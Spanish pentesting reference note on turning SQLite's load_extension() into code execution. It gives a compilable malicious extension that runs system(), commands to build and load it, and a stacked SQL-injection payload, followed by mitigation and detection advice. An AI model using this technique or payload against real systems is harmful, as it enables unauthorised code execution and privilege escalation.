---
topic: SQLite — carga de extensiones y ejecución de código
tags: [linux, sqlite, load-extension, rce, privesc]
---

# SQLite — carga de extensiones y ejecución de código

[🌐 English](sqlite-load-extension.en.md) | **Español**

## Concepto

SQLite puede cargar bibliotecas compartidas como extensiones mediante `load_extension()`. La extensión exporta una función de inicialización que registra funciones SQL; si esa inicialización ejecuta comandos, una consulta SQL se convierte en ejecución de código. La función está deshabilitada por defecto, pero algunas aplicaciones, drivers o builds la habilitan.

## Cuándo aplica

- SQLite con `load_extension()` habilitado (`sqlite3_enable_load_extension`).
- Inyección SQL con capacidad de apilar consultas (`;`) o control de una consulta completa.
- Capacidad de escribir una `.so` en una ruta que el proceso pueda leer.
- El proceso SQLite corre como un usuario con privilegios o con acceso a secretos.
- En Drive, el cliente setuid permitía cargar una extensión desde una ruta controlada.

## Procedimiento

1. Confirmar que `load_extension` está disponible:
   ```sql
   SELECT load_extension('/tmp/noexiste.so');
   ```
   Un error de "not authorized" indica que está deshabilitada; un error de fichero indica que intentó cargarla.
2. Compilar una extensión con una función de inicialización.
3. Escribir la `.so` en `/tmp`, `/dev/shm` o el directorio de trabajo del servicio.
4. Invocarla por SQL o por inyección.
5. Verificar la ejecución (`id > /tmp/out`).

## Comandos

```c
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1
#include <stdlib.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,
                           const sqlite3_api_routines *pApi) {
    SQLITE_EXTENSION_INIT2(pApi);
    system("id > /tmp/sqlite_rce");
    return 0;
}
```

```bash
gcc -shared -fPIC -o evil.so evil.c
sqlite3 target.db "SELECT load_extension('/tmp/evil.so');"
```

```python
import sqlite3
con = sqlite3.connect('target.db')
con.enable_load_extension(True)
con.load_extension('/tmp/evil.so')
```

En una inyección:

```sql
1'; SELECT load_extension('/tmp/evil.so');--
```

## Variantes

- Nombre de entrada distinto: `sqlite3_<nombre>_init` si se llama `load_extension('/tmp/evil.so', 'nombre')`.
- Extensión en Python, Node o PHP usando la API del driver.
- Cargar una extensión legítima con una ruta escribible para desviar la carga.
- Usar `ATTACH DATABASE` o `VACUUM INTO` para escribir ficheros antes de cargar.

## Limitaciones

- `load_extension` deshabilitada en la mayoría de builds.
- SQLite no permite varias sentencias por `execute()` en muchos drivers; hace falta `executescript` o una consulta vulnerable.
- La `.so` debe coincidir con la arquitectura y la versión de SQLite.
- SELinux, AppArmor o un directorio noexec bloquean la carga.

## Mitigación

- Mantener `load_extension` deshabilitada y no llamar a `sqlite3_enable_load_extension`.
- Parametrizar consultas y evitar SQL dinámico.
- Ejecutar el servicio con un usuario sin privilegios y sin acceso a rutas escribibles.
- Montar `/tmp` con `noexec` y auditar la carga de extensiones.

## Detección

- Llamadas a `load_extension` en consultas o logs.
- Creación de `.so` en directorios temporales.
- Procesos SQLite que cargan bibliotecas fuera de las rutas esperadas.
- Escrituras de `system`, `popen` o `execve` desde el proceso de base de datos.

## Referencias

- [SQLite — Loadable extensions](https://www.sqlite.org/loadext.html)
- [SQLite — `load_extension`](https://www.sqlite.org/lang_corefunc.html#load_extension)
- [0xdf — Drive](https://0xdf.gitlab.io/2023/07/15/htb-drive.html)
- [Ficha Drive](../../machines/linux/drive/README.md)
